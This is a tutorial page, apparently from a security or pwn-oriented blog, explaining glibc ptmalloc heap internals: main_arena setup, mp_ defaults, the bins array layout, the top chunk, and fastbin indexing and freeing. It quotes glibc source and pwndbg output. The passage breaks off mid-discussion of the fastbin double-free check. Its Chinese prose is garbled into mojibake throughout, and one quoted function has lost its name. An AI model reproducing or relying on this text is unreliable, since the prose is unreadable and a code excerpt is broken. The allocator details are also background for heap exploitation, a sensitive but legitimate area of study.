<p>é»˜è®¤æƒ…å†µä¸‹è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,ä¹Ÿå°±ä¸ä¼šæœ‰å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªéœ€è¦æœ‰ä¸€ä¸ªåˆ†é…åŒº,ä¹Ÿå°±æ˜¯<code>main_arena</code></p>
<p>åœ¨<code>glibc</code>åŠ è½½è¿›å…¥å†…å­˜ä¹‹å,<code>main_arena</code>è¢«åˆ›å»º,å¹¶ä¸”åˆæ­¥ç²—ç•¥åœ°åˆå§‹åŒ–ä¸€ä¸‹,</p>
<p>å¯¹å„ä¸ª<code>bins</code>çš„åˆå§‹åŒ–éœ€è¦ç­‰<code>malloc_init_state</code>è¢«è°ƒç”¨,è¯¥å‡½æ•°ä¼šåœ¨é¦–æ¬¡åŠ¨æ€åˆ†é…å‰è°ƒç”¨</p>
<p>å¦‚æœæœ‰å¤šæ¡çº¿ç¨‹</p>
<p>é‚£ä¹ˆå°±å¯èƒ½æœ‰å¤šä¸ªåˆ†é…åŒº,å„ä¸ªåˆ†é…åŒºé€šè¿‡<code>next</code>æŒ‡é’ˆç»„æˆç¯çŠ¶å•é“¾è¡¨,</p>
<p>åœ¨åº”å¯¹å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚æ—¶,ä¼šæ²¿ç€<code>next</code>æŒ‡é’ˆæ‰¾åˆ°ä¸€ä¸ªç©ºé—²çš„åˆ†é…åŒºæ»¡è¶³éœ€æ±‚</p>
<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å‘ç”Ÿæ—¶æœº</strong></p>
<p><code>init</code>é‡‡å–æ‡’åŠ è½½æœºåˆ¶,åªä¼šåœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨åˆ°åŠ¨æ€åˆ†é…å‡½æ•°å¦‚<code>malloc</code>æˆ–è€…<code>calloc</code>ç­‰æ—¶æ‰ä¼šè¢«è°ƒç”¨</p>
<p><code>printf</code>ç­‰ä¸€äº›<code>I/O</code>å‡½æ•°ä¹Ÿä¼šè°ƒç”¨åˆ°<code>malloc</code>ç”³è¯·ç¼“å†²åŒº,å¯¼è‡´<code>init</code>å‘ç”Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)			<span class="comment">//åˆå§‹åŒ–æ•´ä¸ªptmallocå †ç®¡ç†å™¨</span></span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)				<span class="comment">//é¿å…é‡è£…</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;			<span class="comment">//æ ‡è®°å·²ç»åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();				<span class="comment">//æ­¤å¤„åˆå§‹åŒ–tcache key, è¯¥keyç”¨æ¥ç¼“è§£double free</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;			<span class="comment">//ä¸»åˆ†é…åŒº(main_arena)æ˜¯ä¸€ä¸ªstaticæ¨¡å—å˜é‡</span></span><br><span class="line">	</span><br><span class="line">  malloc_init_state (&amp;main_arena);		<span class="comment">//å¯¹ä¸»åˆ†é…åŒºè¿›è¡Œåˆå§‹åŒ–</span></span><br></pre></td></tr></table></figure>





<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å†…å®¹</strong></p>
<p>1.<code>bins</code> çš„æ¯ä¸ªå¤´åˆå§‹åŒ–æŒ‡å‘è‡ªå·±,è¡¨ç¤ºæ¡¶å­é‡Œæ²¡æœ‰ç©ºé—²å †å—</p>
<p>2.<code>[ä¸»å…¬æŠ€][é”å®šæŠ€] </code>å¯¹<code>main_arena</code>è®¾ç½®<code>fastbins</code>æœ€å¤§å †å—å¤§å°ä¸è¶…è¿‡<code>0x80</code> (åŒ…å«å…ƒæ•°æ®)</p>
<p>3.åˆå§‹åŒ–<code>topchunk</code>æ¡¶å­å¤´æŒ‡å‘<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) <span class="comment">// NBINS = 128</span></span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at(av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin; <span class="comment">// æœ€åˆæ—¶,å„ä¸ªbinsé“¾è¡¨å¤´éƒ½æŒ‡å‘è‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)		</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous(av);		<span class="comment">//çœ‹ä¸æ‡‚</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)		<span class="comment">//ä¸»åˆ†é…åŒºçš„fastbinsæœ€å¤§å­˜æ”¾0x80çš„å †å—(åŒ…å«å…ƒæ•°æ®)</span></span><br><span class="line">        set_max_fast(DEFAULT_MXFAST); <span class="comment">// 0x80</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    av-&gt;top = initial_top(av);			<span class="comment">//åˆå§‹åŒ–åˆ†é…åŒºå¤´å—,æŒ‡å‘unsortedbinæ¡¶å­å¤´</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹<code>topchunk</code>çš„åˆå§‹åŒ–æ•ˆæœæ˜¯,<code>topchunk</code>æŒ‡å‘<code>unsortedbin</code>æ¡¶å­å¤´</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,</span><br><span class="line">bins = &#123;0x7ffff7fa6ce0 &lt;main_arena+96&gt;, 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,...</span><br></pre></td></tr></table></figure>





<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p>åˆ†é…åŒºé…ç½®æ–‡ä»¶,åªæœ‰ä¸€ä¸ªå®ä¾‹<code>mp_</code>,ä½äº<code>glibc</code>å†…éƒ¨,åœ¨<code>glibc</code>åŠ è½½æ—¶å³å®Œæˆåˆå§‹åŒ–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">        .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">        .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">        .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">        .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">            ,</span><br><span class="line">        .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">        .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">        .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">        .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_</span><br><span class="line"><span class="variable">$15</span> = &#123;</span><br><span class="line">  trim_threshold = 0x20000,</span><br><span class="line">  top_pad = 0x20000,</span><br><span class="line">  mmap_threshold = 0x20000,</span><br><span class="line">  arena_test = 0x8,</span><br><span class="line">  arena_max = 0x0,</span><br><span class="line">  thp_pagesize = 0x0,</span><br><span class="line">  hp_pagesize = 0x0,</span><br><span class="line">  hp_flags = 0x0,</span><br><span class="line">  n_mmaps = 0x0,</span><br><span class="line">  n_mmaps_max = 0x10000,</span><br><span class="line">  max_n_mmaps = 0x0,</span><br><span class="line">  no_dyn_threshold = 0x0,</span><br><span class="line">  mmapped_mem = 0x0,</span><br><span class="line">  max_mmapped_mem = 0x0,</span><br><span class="line">  sbrk_base = 0x0,</span><br><span class="line">  tcache_bins = 0x40,				//tcacheæœ‰0x40ä¸ªæ¡¶å­</span><br><span class="line">  tcache_max_bytes = 0x408,			//tcacheä¸­æœ€å¤§èƒ½æ”¾çš„å †å—å¤§å°</span><br><span class="line">  tcache_count = 0x7,				//ä¸€ä¸ªtcacheæ¡¶å­ä¸­æœ€å¤šæ”¾7å—</span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="æ–Œs"><a href="#æ–Œs" class="headerlink" title="æ–Œs"></a>æ–Œs</h2><p><strong>unsortedbin,smallbins,largebins</strong>å®é™…ä¸Šä½äºåŒä¸€ä¸ªæ•°ç»„çš„ä¸åŒä¸‹æ ‡ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line">								<span class="comment">//NBINS = 128</span></span><br><span class="line">								<span class="comment">//bins[254]</span></span><br></pre></td></tr></table></figure>

<p><code>bins</code>å…±æœ‰<code>254</code>ä¸ªå…ƒç´ ,ä½†æ˜¯å®é™…ä¸Šæ˜¯<code>127</code>ä¸ªæ¡¶å­å¤´,æ¯ä¸ªæ¡¶å­å¤´å ç”¨ç›¸é‚»çš„ä¸¤ä¸ª<code>bins</code>å…ƒç´ </p>
<p>è¿™ä¸ªæ¡¶å­å¤´æŒºå¥‡è‘©çš„,åä¹‰ä¸Šæ¡¶å­å¤´æ˜¯ä¸€ä¸ª<code>malloc_chunk</code>,ç„¶è€Œå®é™…ä¸Šä¸€ä¸ªæ¡¶å­å¤´åªæœ‰<code>fd</code>å’Œ<code>bk</code>ä¸¤ä¸ªæŒ‡é’ˆæœ‰æ•ˆ,å…¶ä»–éƒ¨åˆ†å’Œå‰ä¸€ä¸ªæ¡¶å­å¤´é‡å </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026183930533.png" alt="bin_at"></p>
<p>å¯ä»¥çœ‹åˆ°<code>bins[0]</code>æ—¢å¤„äº<code>bin_at(M,1)-&gt;fd</code>çš„ä½ç½®,åˆå¤„äº<code>bin_at(M,2)-&gt;prev_size</code>çš„ä½ç½®</p>
<p>è€Œå®é™…ä¸Šæ¡¶å­å¤´å¹¶ä¸éœ€è¦<code>prev_size</code>å’Œ<code>size</code>è¿™ä¸¤ä¸ªå±æ€§,åªéœ€è¦å‰é©±åç»§æŒ‡é’ˆå°±å¯ä»¥äº†</p>
<p><strong>å› æ­¤<code>bins[0]</code>æ‰®æ¼”<code>bin_at(M,1)-&gt;fd</code>çš„è§’è‰²</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_at(M,0)								//æ— æ•ˆ</span><br><span class="line">bin_at(M,1) =&gt; unsorted bin				//1ä¸ª</span><br><span class="line">bin_at(M,2~63) =&gt; small bins			//</span><br><span class="line">bin_at(M,64~126) =&gt; large bins</span><br></pre></td></tr></table></figure>



<p><strong>fastbins</strong>æ¯”è¾ƒç‰¹æ®Š,æ˜¯ä¸Šè¿°ä¸‰ç§<code>bins</code>çš„ç¼“å­˜å™¨,è‡ªå·±ä½¿ç”¨ä¸€ä¸ªæ•°ç»„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure>





<h3 id="Topchunk"><a href="#Topchunk" class="headerlink" title="Topchunk"></a>Topchunk</h3><p><code>topchunk</code>æ˜¯æ‚è´§å¸‚åœº</p>
<p>æœ€åˆæ–Œå®¶ä¸€ç©·äºŒç™½, ç”¨æˆ·ä»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>ç›´æ¥æ‹¿è´§, ç”¨å®Œäº†é‡Šæ”¾çš„æ—¶å€™, æ–Œå®¶çš„ä¹±æ–Œæ¥æ‹¾ç ´çƒ‚å„¿, ç„¶åæ‹¿å›å®¶å’Œå¤§æ–Œå°æ–Œåˆ†èµƒ</p>
<p>æ­¤åç”¨æˆ·ä¼˜å…ˆä»æ–Œå®¶æ‹¿è´§, æ–Œå®¶æ²¡è´§æ‰ä¼šå»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>æ‹¿è´§</p>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><p>å¦‚æœå„ä¸ª<code>bin</code>éƒ½æ²¡èƒ½æ»¡è¶³åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªèƒ½è¯·<code>topchunk</code>å‡ºå±±</p>
<p>è¿™æ˜¯<code>ptmalloc</code>å †ç®¡ç†å™¨èƒ½å¤Ÿæ‹¿å‡ºçš„æœ€å¤§å†…å­˜å—äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241031150833167.png" alt="image-20241031150833167"></p>
<h3 id="å¿«æ–ŒFastbins"><a href="#å¿«æ–ŒFastbins" class="headerlink" title="å¿«æ–ŒFastbins"></a>å¿«æ–ŒFastbins</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p><code>fastbins</code>å®é™…ä¸Šæ˜¯ä¸€ç»„å•é“¾è¡¨, è¯¥å•é“¾è¡¨çš„æ‰€æœ‰é™„åŠ å¤´èŠ‚ç‚¹ä½äºåˆ—è¡¨<code>fastbins</code>åˆ—è¡¨ä¸­</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026103730227.png" alt="image-20241026103730227"></p>
<p><code>fastbins</code>ä¸­å…±æœ‰<code>10</code>ä¸ªå•é“¾è¡¨</p>
<p>æ˜¾ç„¶æ¯ä¸ªå•é“¾è¡¨ä¸­å­˜æ”¾å¤§å°ç›¸åŒçš„å †å—,å…·ä½“æ¥è¯´,å †å—å¤§å°åˆ°ä¸‹æ ‡çš„æ˜ å°„ä¸º:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz) </span><br><span class="line">	= ((((<span class="type">unsigned</span> <span class="type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">	= ( sz &gt;&gt; <span class="number">4</span> ) - <span class="number">2</span> </span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">#MAX_FAST_SIZE     </span><br><span class="line">	= (<span class="number">80</span> * SIZE_SZ / <span class="number">4</span>)</span><br><span class="line">    = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">NFASTBINS  </span><br><span class="line">    = (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br><span class="line">    = fastbin_index(<span class="number">0xb0</span>) + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb0</span> / <span class="number">0x10</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xa</span></span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>fastbins idx</th>
<th>mem_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x10</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x40</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>0x80</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0xb0</td>
</tr>
</tbody></table>
<blockquote>
<p>ç„¶è€Œå®é™…ä¸Šåªèƒ½ç”¨åˆ°å‰<code>7</code>ä¸ª,ä¹Ÿå°±æ˜¯<code>[0:6]</code>è¿™<code>7</code>ä¸ªæ¡¶,è¿™æ˜¯åˆ†é…åŒºåˆå§‹åŒ–æ—¶ä¼šé™åˆ¶æœ€å¤§<code>fastbins</code>å †å—å¤§å°ä¸º<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)</p>
<p>ç„¶ååœ¨<code>_int_free</code>å‡½æ•°ä¸­ä¼šæ£€æŸ¥å½“å‰å †å—å¤§å°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())&#123;</span><br><span class="line">    <span class="comment">//å°è¯•ä½¿ç”¨fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå½“å‰å †å—å¤§å°å¤§äº<code>0x80</code>åˆ™ä¸ä¼šé€šè¿‡è¯¥æ£€æŸ¥,ä¹Ÿå°±ä¸ä¼šå¾€<code>fastbins</code>ä¸­å¡</p>
<p>å¦‚æœè°ƒç”¨<code>set_max_fast(s)</code>é‡æ–°è®¾ç½®<code>global_max_fast</code>å€¼,ä½¿å…¶å¤§äº<code>MAX_FAST_SIZE</code>,ä¹Ÿæ˜¯ä¸å¯ä»¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">INTERNAL_SIZE_T</span></span><br><span class="line"> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥<code>__builtin_unreachable</code></p>
</blockquote>
<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><p>å¿«æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.<code>free</code>æ—¶<code>tcache</code>æœªå¯ç”¨æˆ–è€…å·²ç»å……æ»¡,å¹¶ä¸”å †å—ä¸æ˜¯<code>mmap</code>å †å—,å¹¶ä¸”å¤§å°åœ¨å¿«æ–Œç®¡ç†èŒƒå›´å†…,å¹¶ä¸”å¿«æ–Œç¼ºè´§, é‚£ä¹ˆå¿«æ–Œä¼šç•™ä¸‹è¿™å—</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>å½“å¯¹åº”å †å—å¤§å°çš„<code>tcache</code>è¢«å¡«å……æ»¡ä¹‹å,å¦‚æœè¿˜æœ‰ç›¸åŒå¤§å°çš„å †å—é‡Šæ”¾,ä¼šå…ˆå°è¯•æ”¾åˆ°<code>fastbins</code>ä¸­</p>
<p>åœ¨<code>x64</code>ä¸Š,é»˜è®¤æƒ…å†µä¸‹,å°äº<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)çš„å †å—,æ‰ä¼šè¢«å¡åˆ°<code>fastbins</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_malloc.c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);								<span class="comment">//sizeæ¢ç®—æ¡¶ä¸‹æ ‡</span></span><br><span class="line">fb = &amp;fastbin(av, idx);												<span class="comment">//æ¡¶å­å¤´èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;											<span class="comment">//*fbæ˜¯æ¡¶å­å¤´åŸæ¥æŒ‡å‘çš„ç¬¬ä¸€ä¸ªchunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)			<span class="comment">//å¦‚æœå½“å‰è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,é‚£ä¹ˆæ˜¾ç„¶åªä¼šä½¿ç”¨åˆ°main_arena,ä¸ä¼šæœ‰å…¶ä»–åˆ†é…åŒº</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span>									<span class="comment">//å”æ°ä¸€æ ·çš„DFåˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								<span class="comment">//å½“å‰é‡Šæ”¾çš„pæ˜¯å¦å’Œä¸Šæ¬¡é‡Šæ”¾æ˜¯åŒä¸€å—</span></span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);								<span class="comment">//å¤´æ’æ³•ä¸Šé“¾,åç»§æŒ‡é’ˆä¹Ÿä½¿ç”¨SafeLinking</span></span><br><span class="line">    *fb = p;														<span class="comment">//æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸çš„</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">           add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸å”æ°çš„äºŒæ¬¡é‡Šæ”¾æ£€æŸ¥</p>
